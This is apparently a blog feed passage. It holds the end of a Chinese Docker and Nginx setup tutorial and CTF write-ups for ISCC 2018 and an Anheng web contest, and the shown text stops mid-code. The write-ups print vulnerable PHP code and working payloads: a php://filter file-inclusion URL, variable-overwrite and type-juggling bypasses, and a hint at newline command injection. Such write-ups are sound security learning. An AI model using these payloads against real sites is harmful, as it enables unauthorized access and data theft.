class="code"><pre><span class="line"> man命令</span><br><span class="line">如</span><br><span class="line">man docker-run</span><br><span class="line">man docker-top</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Docker中部署静态网页"><a href="#Docker中部署静态网页" class="headerlink" title="Docker中部署静态网页"></a>Docker中部署静态网页</h3><h4 id="设置容器的端口映射"><a href="#设置容器的端口映射" class="headerlink" title="设置容器的端口映射"></a>设置容器的端口映射</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run   [-P][-p]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-P: 对容器所有的端口进行映射</span><br><span class="line">-p: 指定映射哪些容器的端口</span><br></pre></td></tr></table></figure><p>下面是几个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">containerPort 只指定容器的端口，宿主机的端口随机映射</span><br><span class="line">docker run -p 80 -i  -t /bin/bash</span><br><span class="line">hostPort:ContainerPort 同时制定宿主机端口以及容器端口</span><br><span class="line"> docker run -p 8080:80 -i -t /bin/bash</span><br><span class="line"> ip:containerPort 指定ip和容器的端口</span><br><span class="line"> docker run -p 0.0.0.0:80 -i -t /bin/bash</span><br><span class="line"> ip:hostPort:ContainerPort 同时制定ip以及宿主机端口以及容器端口</span><br><span class="line"> docker run -p 0.0.0.0:8080:80 -i -t /bin/bash</span><br></pre></td></tr></table></figure><h4 id="Nginx部署流程"><a href="#Nginx部署流程" class="headerlink" title="Nginx部署流程"></a>Nginx部署流程</h4><p>先运行一个带端口映射的容器并命名为web</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>然后安装Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y nginx</span><br></pre></td></tr></table></figure><p>安装Vim编辑器 ，主要是为了方便修改东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y vim</span><br></pre></td></tr></table></figure><p>新建一个工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /var/www/html</span><br></pre></td></tr></table></figure><p>切换到工作目录下,编辑一个静态页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cd</span> /var/www/html</span><br><span class="line">vim index.html</span><br></pre></td></tr></table></figure><p>自己喜欢写点啥就写啥吧</p><p>查找一下Nginx文件的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure><p>查看etc下面的Nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx</span><br></pre></td></tr></table></figure><p>进去里面的sites-enabled目录里面，发现一个default文件打开编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/nginx/sites-enabled</span><br><span class="line"> vim default</span><br></pre></td></tr></table></figure><p>改变root的值为你的网页目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root: /var/www/html</span><br></pre></td></tr></table></figure><p>开始运行nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><p> <code>ps -ef</code> 查看相关进程是否启动</p><p>让它继续后台运行<br>可以用下面几个命令查看端口号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps </span><br><span class="line">docker port 容器ID/名字</span><br><span class="line">docker top 容器ID/名字</span><br></pre></td></tr></table></figure><p>然后再curl一波就知道，是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:32770</span><br></pre></td></tr></table></figure><p>也可以本机的浏览器里面打开。。</p><p>还可以用容器的ip地址去实现在本机浏览器的浏览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器ID/名字</span><br></pre></td></tr></table></figure><p>可以看到容器ip地址和映射端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“IPAddress”: “172.17.0.2”</span><br><span class="line">“HostPort”: “32768”</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.17.0.2</span><br></pre></td></tr></table></figure><p>这就不需要指定端口号了，用默认的80端口就可以访问<br>停止该容器，然后再次启动</p><p>我们需要注意一旦我们关闭并且重新启动的话，docker分配的映射ip以及端口地址都会改变，需要重新查看</p><p>镜像标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TAG </span><br><span class="line"> ubuntu:latest</span><br><span class="line"> ubuntu:14.04</span><br></pre></td></tr></table></figure><p>啥都不写默认<code>latest</code>标签</p><p>删除镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名:标签/ID</span><br></pre></td></tr></table></figure><p>搜索镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search</span><br></pre></td></tr></table></figure><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> docker pull 你搜到的镜像名</span><br><span class="line">docker push命令可以将某一个镜像发布到官方网站。</span><br></pre></td></tr></table></figure><p>利用DockerFile构建镜像 ,这个东西有时候还是很好用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t=<span class="string">'自定义名字'</span> DockerFile</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;容器&quot;&gt;&lt;a href=&quot;#容器&quot; class=&quot;headerlink&quot; title=&quot;容器&quot;&gt;&lt;/a&gt;容器&lt;/h2&gt;&lt;p&gt;一种虚拟化方案&lt;br&gt;操作系统级别的虚拟化&lt;br&gt;只能运行相同或相似内核的操作系统&lt;br&gt;依赖于Linux内核特性&lt;br&gt;
    
    </summary>
    
      <category term="Docker" scheme="0verwatch.top/categories/Docker/"/>
    
    
      <category term="环境部署" scheme="0verwatch.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
      <category term="Docker" scheme="0verwatch.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>ISCC 2018做题记录</title>
    <link href="0verwatch.top/2018/05/25/ISCC-2018-wp/"/>
    <id>0verwatch.top/2018/05/25/ISCC-2018-wp/</id>
    <published>2018-05-25T12:05:49.000Z</published>
    <updated>2018-05-25T12:20:13.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉自己好菜，只会做几个题目，而且打打停停，还要应付各种考试，忙不过来，以后还是要更加努力学习啊。。还是先记录一下自己的做题过程，慢慢进步，跟不上大佬们的步伐啊emmm。。<br><a id="more"></a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>直接改图片高度就好<br><img src="https://s1.ax1x.com/2018/05/25/CfUge0.png" alt="CfUge0.png"><br>得到flag<br><img src="https://s1.ax1x.com/2018/05/25/CfURoT.png" alt="CfURoT.png"></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>打开文件发现是一堆AB立刻想到是培根密码，直接培根解密得到flag，注意最后提交的是大写</p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>发现一段<code>base64</code>编码。不断base64解码，注意期间还要URL编码，这就有点麻烦了，当你base64解码不行的时候，尝试一下<code>AES解密</code>，这里key为空，解密网址 <a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">http://tool.oschina.net/encrypt/</a><br>得到下面的东西<br>答案就是后面这句但已加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</span><br></pre></td></tr></table></figure><p>这里有点脑洞了，我之前不知道有这种东西，叫<code>与佛论禅</code><br>解密网址 <a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>解密后得到flag</p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>这个题目一开始用HXD打开发现里面存在某款软件的文件名<br><img src="https://s1.ax1x.com/2018/05/25/CfUISJ.png" alt="CfUISJ.png"></p><p>于是立即下载使用该软件打开这张图片，发现下面有多个图层，是一张二维码，直接拼接扫描即可<br><img src="https://s1.ax1x.com/2018/05/25/CfUol9.png" alt="CfUol9.png"></p><h3 id="秘密电报-1"><a href="#秘密电报-1" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>直接十六进制解码即可</p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>根据题目应该是凯撒密码位移13位也就是rot13，然后就是脑洞题目了，键盘密码，每一位都是对应键盘的下一行，直接出来flag</p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>这个题目也很厉害，我弄了很久，但是里面也有与佛论禅。。。。<br>先是在HXD里面找到了office的踪迹，于是我手动提取出来，可能别的大佬有更好的方法<br><img src="https://s1.ax1x.com/2018/05/25/CfU7O1.png" alt="CfU7O1.png"><br>然后打开<br><img src="https://s1.ax1x.com/2018/05/25/CfUqw6.png" alt="CfUqw6.png"><br>又是与佛论禅，出题人是有多喜欢。。。<br>解出来发现是一堆16进制，房间converter里面解码<br>得到一堆base64，再解一下就是base32,再解一下16进制，就是这样一直解下去就好</p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>这道题目考了一个zip包的伪加密，然后直接凯撒解密就好。。。很简单</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>直接改前端代码就好，改大一点<br><img src="https://s1.ax1x.com/2018/05/25/CfUjYD.png" alt="CfUjYD.png"><br>然后输入数字，得到flag</p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>这题很简单，直接改xff为127.0.0.1即可</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>打开发现一段类似base64的东西，首先要把这东西url编码之后再解base64，发现一段以+开头以-结尾的编码，utf7编码，给个解码网址 <a href="http://toolswebtop.com/text/process/decode/utf-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/decode/utf-7</a></p><p>得到 <code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script&gt;</code><br>把<code>/%nsfocusXSStest%/</code>提交到文本框里就可以得到flag了</p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>这个题目考的是文件包含漏洞，利用f参数读取，根据f参数猜测后台为include(‘文件名’.’php’) ,尝试用伪协议把源码读出来，但题目说了要绕过，肯定不简单<br>这里我们用大写去绕过，读取index.php<br><a href="http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="noopener">http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=2</a><br>得到一串base64，解码之后得到flag</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>改一下Client-ip:127.0.0.1 发包就得到flag</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>这个题是代码审计题目，源码在index.php.txt 里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始这一题还是懵，不知道flag究竟放在哪个变量里面，经过提示是在$flag里面，有确定的目标就很好做了<br>发现代码里面有两个<code>$</code>,利用了变量覆盖把flag参数里面的内容改掉，然后最后利用die函数把flag里面的内容打印出来<br>我们得先获得<code>$flag</code>变量里面的内容，我们可以利用get的变量覆盖把里面的内容赋值到<code>$_200</code>这一个变量里面，这样就可以充分利用<code>die</code>这一个函数了<br>然后下面紧接着一个post的变量覆盖还有一个post的判断，但是此时我们并不知道<code>$flag</code> 里面的内容，我们只能利用变量覆盖改变<code>$flag</code>里面的内容，这也说明了<code>$flag</code>这个变量是可控的。。我们可以随意的修改并且绕过判断，这样我们就可以得到flag了<br> payload:<br>get数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8009?_200=flag</span><br></pre></td></tr></table></figure><p>post数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=1</span><br></pre></td></tr></table></figure><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p>首先进去第一关是MD5弱类型比较，直接找一个QNKCDZO代入就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123; </span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>]; </span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    $username=<span class="string">"hello"</span>; </span><br><span class="line">    $password=<span class="string">"hello"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(md5($password) == <span class="number">0</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"xxxxx"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二关发现两个$，于是尝试一波<code>GLOBALS</code>全局变量，get一个<code>a=GLOBALS</code> 直接出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line">$a = @$_REQUEST[<span class="string">'a'</span>]; </span><br><span class="line">str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$a); </span><br><span class="line">str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$a); </span><br><span class="line">@<span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/25/CfaFTf.png" alt="CfaFTf.png"></p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>非预期解<br>直接上御剑扫描目录发现有flag.txt访问即可</p><p>预期解<br>好像是利用ping参数去执行各种命令，用%0a去绕过好像。。。没有详细去尝试</p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>这也是个代码审计的题目，题目隐藏在index.php.txt里面，发现出题人很喜欢把源代码放在这个文件里面啊</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"***********"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$a = fla;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</span><br><span class="line">$b = g;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个很简单的绕过，只是组合这来考查数据的表示方法绕过还有数组绕过</p><p>首先这个函数<code>strcasecmp</code>出现在<code>==</code>后面，一旦<code>==</code>出现我们就要警惕了，这里我们可以使这个函数报错然后使之满足弱类型<code>0 == false</code>这样就绕过了第一个判断，使<code>$a=fla</code>，这是为了使后面的<br><code>if ($a.$b == &quot;flag&quot;)</code>，然后在审计下面的<code>password</code>部分，password的部分其实就是一个典型的数字绕过的代码审计题目，我们可以选择用科学计数法去绕过，这里我用的是<code>9e9</code>,所以我最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8017/?username[]=123&amp;password=9e9</span><br></pre></td></tr></table></figure><h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>这一题根据题目给的提示把referer还有各种有关ip的参数都改掉发包发现一个奇怪的地址<br><img src="https://s1.ax1x.com/2018/05/25/CfaPmt.png" alt="CfaPmt.png"><br>打开地址的源代码发现有一段奇怪的base64<br><img src="https://s1.ax1x.com/2018/05/25/CfaVfg.png" alt="CfaVfg.png"><br>解码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;password:xinyiji.com&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个就是密码，输入就得到flag</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="RSA256"><a href="#RSA256" class="headerlink" title="RSA256"></a>RSA256</h3><p>这个题完全考的不是逆向，完完全全的密码学RSA<br>打开发现一个公钥文件<br>用OpenSSL打开公钥文件得到他的模数n，于是去factordb.com分解一波模数<br>得到p和q<br>然后常规操作得到秘钥d<br>然后用rsa-tool得到秘钥文件，又重新用openssl以一个解密就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message1 -inkey key.pem -out flag.txt</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message2 -inkey key.pem -out flag2.txt</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message3 -inkey key.pem -out flag3.txt</span><br></pre></td></tr></table></figure><p>我们把文件重定向以后就得到flag<br><img src="https://s1.ax1x.com/2018/05/25/Cfan6s.png" alt="Cfan6s.png"></p><p>最后在此求一波大佬的wp学习啊。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;感觉自己好菜，只会做几个题目，而且打打停停，还要应付各种考试，忙不过来，以后还是要更加努力学习啊。。还是先记录一下自己的做题过程，慢慢进步，跟不上大佬们的步伐啊emmm。。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒5月赛web题目做题记录</title>
    <link href="0verwatch.top/2018/05/24/anheng-5month/"/>
    <id>0verwatch.top/2018/05/24/anheng-5month/</id>
    <published>2018-05-24T12:47:47.000Z</published>
    <updated>2018-06-23T13:33:00.149Z</updated>
    
    <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>这是一道代码审计的题目，又发现了一个我以前没见过的知识点，可以详细看看这个链接<br><a href="https://wooyun.shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="noopener">https://wooyun.shuimugan.com/bug/view?bug_no=64792</a><br><a id="more"></a><br><img src="https://s1.ax1x.com/2018/05/24/CWrqSS.png" alt="CWrqSS.png"><br>从上面可以看出，简单点解释就是当代码中存在<code>$_REQUEST[&#39;user_id&#39;]</code>里面类似的参数的时候，我们在url上可以这样<code>a.php?user.id</code>传参去进行绕过,这样进去之后也能表示<code>$_REQUEST[&#39;user_id&#39;]</code>的值，同样可以绕过的符号还有<code>+，[</code> 等，应该说是php的一个小特性，上面讲的很清楚了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示<code>A_A,have fun</code>，就不能继续往下面执行到<code>file_get_contents(&#39;flag.php&#39;)</code>了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用<code>A.A</code>或者是<code>A+A</code>去传参去绕过。<br>下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小，下面是操作<br><img src="https://s1.ax1x.com/2018/05/24/CWrXLj.png" alt="CWrXLj.png"><br>所以说，我们可以利用数组去绕过<code>$str&lt;9999999999</code>的特性，下面一个判断是强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为<code>“admin”== 0</code> ，结果是true，直接等于0绕过即可，所以这题的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 